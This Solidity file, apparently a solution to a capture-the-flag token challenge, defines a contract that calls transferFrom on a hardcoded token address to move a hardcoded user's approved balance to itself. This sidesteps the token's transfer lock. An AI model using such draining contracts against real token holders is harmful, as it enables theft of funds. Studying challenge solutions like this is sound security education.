// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract NaughtCoinSolution {
  address private naughtCoinContract = 0x6C74C66ECC7d5E503585D49885FBE90085E0815D;
  address private user = 0xF580A030d2f0E9667aB3c5c8a51Da63f086Db564;

  function getAllBalance(uint256 _balance) external {
    IERC20(naughtCoinContract).transferFrom(user, address(this), _balance);
  }
}
